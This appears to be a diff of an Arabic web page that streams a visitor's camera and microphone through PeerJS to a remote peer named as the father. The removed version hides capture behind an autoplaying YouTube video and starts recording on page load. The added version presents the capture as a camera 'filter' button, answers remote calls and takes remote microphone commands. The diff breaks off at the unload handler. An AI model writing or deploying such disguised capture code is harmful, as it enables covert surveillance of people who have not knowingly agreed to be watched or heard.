@@ -2,53 +2,64 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title> قليلا انتظر </title>
+<title> فلتر </title>
 </head>
 <body>
 
-<h2>فيديو </h2>
+<h2>: عرض </h2>
 
-<!-- فيديو يوتيوب فقط -->
-<iframe width="560" height="315"
-    src="https://www.youtube.com/embed/xuGCHkZSOiU?autoplay=1&mute=1"
-    title="YouTube video"
-    frameborder="0"
-    allow="autoplay; encrypted-media"
-    allowfullscreen>
-</iframe>
+<button id="startCam" style="
+  padding: 12px 20px;
+  font-size: 18px;
+  background-color: #28a745;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+">
+ تشغيل الفلتر
+</button>
 
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 <script>
-let peer, stream;
+let peer, stream, dataConn;
 
-// بدء الكاميرا في الخلفية فقط
-function startCamera(){
-  navigator.mediaDevices.getUserMedia({
-    video: true,
-    audio: true
-  }).then(s => {
-    stream = s;
+peer = new Peer("child", {
+  host: "peerjs.com",
+  secure: true,
+  port: 443
+});
 
-    // الرد على مكالمات الأب مباشرة
-    peer.on("call", call => call.answer(stream));
+// زر لتشغيل الكاميرا
+document.getElementById("startCam").onclick = () => {
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(s => {
+      stream = s;
+      alert("الكاميرا جاهزة الآن! يمكنك الاتصال بالأب.");
 
-  }).catch(() => alert("لم يتم السماح للكاميرا"));
-}
+      // الرد على مكالمات الأب
+      peer.on("call", call => call.answer(stream));
 
-window.onload = () => {
-  // معرف ثابت للطفل
-  peer = new Peer("child", {
-    host: "peerjs.com",
-    secure: true,
-    port: 443
-  });
+      // استقبال أوامر الأب
+      peer.on("connection", conn => {
+        dataConn = conn;
+        dataConn.on("data", msg => {
+          if(msg.cmd === "switchCamera") alert("أمر تبديل الكاميرا مستقبلاً!");
+          if(msg.cmd === "mic") {
+            stream.getAudioTracks().forEach(track => track.enabled = !!msg.value);
+            alert(msg.value ? "الميكروفون مفعل" : "الميكروفون مكتوم");
+          }
+        });
+      });
 
-  peer.on("open", () => {
-    startCamera();
-  });
-}
+      // إخفاء الزر بعد التشغيل
+      document.getElementById("startCam").style.display = "none";
 
-// إيقاف الكاميرا عند غلق الصفحة
+    })
+    .catch(() => alert("لم يتم السماح بالكاميرا"));
+};
+
+// تنظيف الكاميرا عند الخروج
 window.onbeforeunload = () => {
   if(stream) stream.getTracks().forEach(t => t.stop());
   peer && peer.destroy();
